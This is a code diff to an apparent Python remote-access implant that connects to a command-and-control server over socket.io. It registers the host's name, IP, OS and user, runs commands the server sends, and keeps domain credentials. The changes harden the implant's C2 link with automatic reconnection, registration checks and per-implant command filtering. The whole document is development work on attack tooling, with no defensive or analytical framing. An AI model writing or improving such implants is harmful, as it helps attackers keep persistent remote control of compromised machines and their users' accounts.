@@ -41,9 +41,10 @@ class Implant:
         self.domain_user = domain_user
         self.domain_password = domain_password
         self.implant_id = str(uuid.uuid4())
-        self.sio = socketio.Client()
+        self.sio = socketio.Client(reconnection=True, reconnection_attempts=5)
         self.command_queue = queue.Queue()
         self.running = True
+        self.connected = False
         
         # System information
         self.hostname = socket.gethostname()
@@ -59,42 +60,64 @@ class Implant:
         @self.sio.event
         def connect():
             logger.info("Connected to C2 server")
+            self.connected = True
             self.register()
         
         @self.sio.event
         def disconnect():
             logger.info("Disconnected from C2 server")
+            self.connected = False
             self.reconnect()
+        
+        @self.sio.on('registered')
+        def on_registered(data):
+            if data.get('status') == 'success':
+                logger.info("Successfully registered with C2 server")
+            else:
+                logger.error("Registration failed")
+                self.sio.disconnect()
         
         @self.sio.on('command')
         def on_command(data):
             command = data.get('command')
-            if command:
+            if command and data.get('implant_id') == self.implant_id:
+                logger.info(f"Received command: {command}")
                 self.command_queue.put(command)
     
     def register(self):
         """Register with the C2 server"""
         try:
-            self.sio.emit('register', {
+            if not self.connected:
+                logger.error("Not connected to C2 server")
+                return
+            
+            registration_data = {
                 'id': self.implant_id,
                 'hostname': self.hostname,
                 'ip': self.ip,
                 'os': self.os,
                 'user': self.user
-            })
+            }
+            logger.info(f"Registering with C2 server: {registration_data}")
+            self.sio.emit('register', registration_data)
         except Exception as e:
             logger.error(f"Registration failed: {e}")
+            self.sio.disconnect()
     
     def reconnect(self):
         """Attempt to reconnect to the C2 server"""
-        while self.running:
-            try:
-                if not self.sio.connected:
-                    self.sio.connect(self.c2_url)
-                    break
-            except Exception as e:
-                logger.error(f"Reconnection failed: {e}")
-                time.sleep(5)
+        if not self.running:
+            return
+            
+        logger.info("Attempting to reconnect...")
+        try:
+            if not self.sio.connected:
+                self.sio.connect(self.c2_url)
+        except Exception as e:
+            logger.error(f"Reconnection failed: {e}")
+            time.sleep(5)
+            if self.running:
+                self.reconnect()
     
     def execute_command(self, command):
         """Execute a command and return the result"""
@@ -288,6 +311,7 @@ class Implant:
         """Start the implant"""
         try:
             # Connect to C2 server
+            logger.info(f"Connecting to C2 server at {self.c2_url}")
             self.sio.connect(self.c2_url)
             
             # Start command worker thread
@@ -295,10 +319,15 @@ class Implant:
             worker_thread.daemon = True
             worker_thread.start()
             
-            # Keep main thread alive
+            # Keep main thread alive and handle reconnection
             while self.running:
+                if not self.connected and not self.sio.connected:
+                    logger.info("Connection lost, attempting to reconnect...")
+                    self.reconnect()
                 time.sleep(1)
+                
         except KeyboardInterrupt:
+            logger.info("Shutting down implant...")
             self.running = False
             self.sio.disconnect()
         except Exception as e:
